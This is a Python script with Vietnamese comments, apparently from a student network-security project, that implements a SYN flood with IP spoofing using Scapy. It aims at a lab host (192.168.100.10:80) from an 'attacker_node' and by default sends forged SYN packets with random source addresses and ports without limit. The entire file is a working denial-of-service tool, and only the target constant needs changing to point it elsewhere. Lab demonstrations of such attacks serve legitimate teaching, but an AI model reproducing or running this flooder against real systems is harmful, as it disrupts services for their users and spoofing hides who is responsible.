#!/usr/bin/env python3
"""
==============================================================================
FR2 - MINH HỌA NGUYÊN LÝ BẰNG PYTHON SCAPY (MULTI-IP SPOOFING)
Chạy trên: attacker_node (192.168.100.20)
==============================================================================
Mô tả (Trích từ tài liệu Báo cáo đồ án):
Tự tạo gói tin thô (Raw Packet) ở tầng IP và TCP, bật cờ SYN (flags='S'),
ngẫu nhiên hóa cổng nguồn (sport) và địa chỉ IP nguồn (generate_random_ip())
để chứng minh năng lực hiểu sâu giao thức và thuật toán bắt tay 3 bước TCP.
==============================================================================
"""

import sys
import random
import time
from scapy.all import IP, TCP, send

TARGET_IP = "192.168.100.10"
TARGET_PORT = 80

def generate_random_ip():
    """Tạo địa chỉ IPv4 ngẫu nhiên cho từng gói tin (IP Spoofing)"""
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def start_syn_flood(target_ip, target_port, packet_count=0):
    print("=" * 70)
    print(f"[*] BẮT ĐẦU PHÁT TÁN GÓI SYN FLOOD TỚI {target_ip}:{target_port}...")
    if packet_count > 0:
        print(f"[*] Giới hạn số lượng gói: {packet_count}")
    else:
        print(f"[*] Chế độ: Liên tục không giới hạn (Nhấn Ctrl+C để dừng)")
    print("=" * 70)

    sent = 0
    try:
        while True:
            spoofed_ip = generate_random_ip()
            # 1. Tạo gói tin IP với IP nguồn giả mạo
            ip_layer = IP(src=spoofed_ip, dst=target_ip)

            # 2. Tạo gói tin TCP với cờ SYN (S), cổng nguồn ngẫu nhiên
            src_port = random.randint(1024, 65535)
            seq_num = random.randint(1000, 900000)
            tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=seq_num, window=64240)

            # 3. Đóng gói và gửi raw packet qua card mạng
            packet = ip_layer / tcp_layer
            send(packet, verbose=False)
            sent += 1

            if sent % 100 == 0:
                print(f"[+] Đã gửi {sent} gói SYN tới {target_ip}:{target_port} (Gần nhất: {spoofed_ip}:{src_port})")

            if packet_count > 0 and sent >= packet_count:
                break

    except KeyboardInterrupt:
        print("\n[!] Dừng bởi người dùng.")
    finally:
        print(f"[+] Hoàn tất. Tổng số gói SYN đã phát tán: {sent}")

if __name__ == "__main__":
    count = int(sys.argv[1]) if len(sys.argv) > 1 else 0
    start_syn_flood(TARGET_IP, TARGET_PORT, count)
